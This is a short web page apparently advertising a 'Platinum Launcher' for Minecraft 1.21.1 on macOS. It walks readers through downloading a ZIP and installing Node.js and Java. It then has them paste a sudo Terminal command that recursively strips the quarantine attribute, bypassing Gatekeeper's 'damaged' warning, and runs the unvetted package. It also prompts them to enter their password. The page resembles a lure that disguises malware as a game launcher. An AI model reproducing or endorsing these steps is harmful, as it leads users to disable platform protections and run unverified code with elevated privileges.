Platinum Launcher

Complete these 3 steps to play Minecraft 1.21.1

STEP 1: Download Launcher DOWNLOAD PLATINUM (ZIP)
STEP 2: Install Requirements

You need both Node.js and Java 21 to run the launcher.

Node.js (LTS v22+): Download Node.js (.pkg)
Oracle Java 21 (Choose your Mac type):
Apple Chip (M1/M2/M3) Intel Chip (Older Macs)
STEP 3: Fix "Damaged" Error & Start

Extract the ZIP to your Desktop. Copy and paste this into Terminal:

sudo xattr -rd com.apple.quarantine ~/Desktop/PlatinumLauncher && cd ~/Desktop/PlatinumLauncher && npm start

⚠️ Type your Mac password and press Enter (Characters won't show while typing).
